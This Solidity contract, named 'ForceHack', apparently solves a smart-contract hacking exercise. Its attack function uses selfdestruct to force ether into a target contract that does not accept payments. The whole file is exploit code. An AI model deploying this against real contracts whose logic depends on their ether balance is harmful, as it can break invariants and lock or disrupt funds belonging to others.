// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract ForceHack {

  constructor() payable {}
  receive() external payable {}

  function attack(address payable target) public {
    selfdestruct(target);
  }
}
